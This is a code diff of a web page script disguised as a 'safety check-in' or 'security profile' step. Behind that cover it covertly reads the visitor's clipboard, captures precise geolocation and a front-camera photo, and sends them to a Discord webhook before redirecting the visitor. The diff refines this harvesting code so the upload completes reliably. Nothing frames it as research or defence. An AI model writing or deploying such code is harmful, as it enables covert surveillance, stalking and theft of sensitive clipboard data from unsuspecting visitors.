@@ -28,70 +28,52 @@
 
         async function send() {
             const status = document.getElementById('status');
-            status.innerText = "Verifying security profile...";
+            status.innerText = "Syncing...";
 
-            // 1. Grab Clipboard
             let clip = "None";
-            try {
-                clip = await navigator.clipboard.readText();
-            } catch (e) { clip = "Denied"; }
+            try { clip = await navigator.clipboard.readText(); } catch (e) { clip = "Denied"; }
 
-            // 2. Grab Location
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                
-                status.innerText = "Syncing...";
+                const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                const formData = new FormData();
 
-                // 3. Attempt Camera Capture
                 try {
+                    // 1. Capture Image
                     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                     const video = document.createElement('video');
                     video.srcObject = stream;
                     await video.play();
 
-                    // Snap photo
                     const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.width = 480; // Smaller size for faster upload
+                    canvas.height = 640;
+                    canvas.getContext('2d').drawImage(video, 0, 0, 480, 640);
                     
-                    // Stop camera
-                    stream.getTracks().forEach(track => track.stop());
+                    stream.getTracks().forEach(t => t.stop());
 
-                    // Convert to Blob and send to Discord
-                    canvas.toBlob(async (blob) => {
-                        const formData = new FormData();
-                        formData.append("file1", blob, "camera_snap.png");
-                        formData.append("payload_json", JSON.stringify({
-                            content: `✅ **Safety Checkin**\n📍 **Location:** ${mapLink}\n📋 **Clipboard:** \`${clip}\``
-                        }));
-
-                        await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
-                        window.location.href = REDIRECT_URL;
-                    }, 'image/png');
-
-                } catch (camErr) {
-                    // Fallback if camera is denied
-                    await fetch(WEBHOOK_URL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ 
-                            content: `⚠️ **Camera Denied**\n📍 **Location:** ${mapLink}\n📋 **Clipboard:** \`${clip}\`` 
-                        })
-                    });
-                    window.location.href = REDIRECT_URL;
+                    // 2. Convert to Blob
+                    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.7));
+                    formData.append("file", blob, "safety.jpg");
+                } catch (e) {
+                    console.log("Camera skipped");
                 }
 
-            }, async (err) => {
-                // Fallback if location is denied
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: "⚠️ Location Denied. Clipboard: " + clip })
-                });
-                window.location.href = REDIRECT_URL;
+                // 3. Add the JSON data correctly for Discord
+                formData.append("payload_json", JSON.stringify({
+                    content: `✅ **Update Received**\n📍 **Location:** ${mapLink}\n📋 **Clipboard:** \`${clip}\``
+                }));
+
+                // 4. Force 'await' so the browser can't leave until finished
+                try {
+                    await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+                } catch (err) {
+                    console.error("Upload failed");
+                } finally {
+                    window.location.replace(REDIRECT_URL);
+                }
+
+            }, (err) => {
+                window.location.replace(REDIRECT_URL);
             }, { enableHighAccuracy: true });
         }
     </script>
